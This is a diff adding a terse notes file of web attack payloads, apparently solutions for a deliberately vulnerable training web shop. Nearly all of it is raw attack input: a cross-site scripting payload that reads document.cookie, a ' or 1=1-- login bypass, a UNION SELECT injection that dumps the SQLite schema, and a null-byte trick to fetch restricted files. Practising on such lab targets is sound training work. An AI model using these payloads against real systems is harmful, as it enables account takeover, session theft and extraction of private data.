@@ -1,0 +1,14 @@
+GET /ftp/legal.md HTTP/1.1 to GET /ftp/acquisitions.md HTTP/1.1
+
+<img src = x onerror="prompt(document.cookie)"> 
+
+ Email: 'or 1=1--
+ Password: abcd 
+
+
+
+Replace /rest/user/whoami with /rest/tomato, 
+
+GET/rest/products/search?q=banana'))UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM% 20sqlite_master-- HTTP/1.1
+
+GET /ftp/suspicious_errors.yml%2500.md HTTP/1.1
